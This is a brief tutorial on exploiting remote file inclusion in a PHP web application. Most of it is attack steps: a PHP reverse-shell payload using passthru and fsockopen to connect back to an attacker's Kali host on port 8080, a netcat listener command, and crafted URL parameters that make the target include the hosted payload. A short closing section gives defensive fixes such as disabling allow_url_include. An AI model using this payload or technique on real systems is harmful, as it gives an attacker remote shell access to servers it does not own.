server - web.com/example/mainpage/ping/?input="INPUT"/1
WEB_PUBLIC/KALI_IP - the apache2 server(Kali linux public ip)

Start apache2
Create a remote reverse conneection backdoor ,lets for example assume our target uses PHP.
If the target will open our webserver he will read and execute our code, lets create the code.
PHP code,

<?php
passthru("php -r '$sock=fsockopen("KALI_IP",8080);exec("/bin/sh -i <&3 >&3 2>&3");'");
?>

passthru - will execute any os command
This code should be printed as txt on our apache2 server, the target will read and execute that.
Listen to connections on kali by, "nc -vv -l -p 8080".

Now as the whatever kind of input the server ask as the url we will set the input to our apache2 server,

web.com/example/mainpage/ping/?input="WEB_PUBLIC"/1
web.com/example/mainpage/ping/?input="WEB_PUBLIC"/1?

WEB_PUBLIC is the link to that file,
Try also adding a question mark to the end so the server will also execute it as PHP



SOLUTION:
Disable allow_url_fopen & allow_url_include

Use static file inclusion
instead of using, include($_GET['page');
(This will take the user input as a website) We can use, include('page.php');
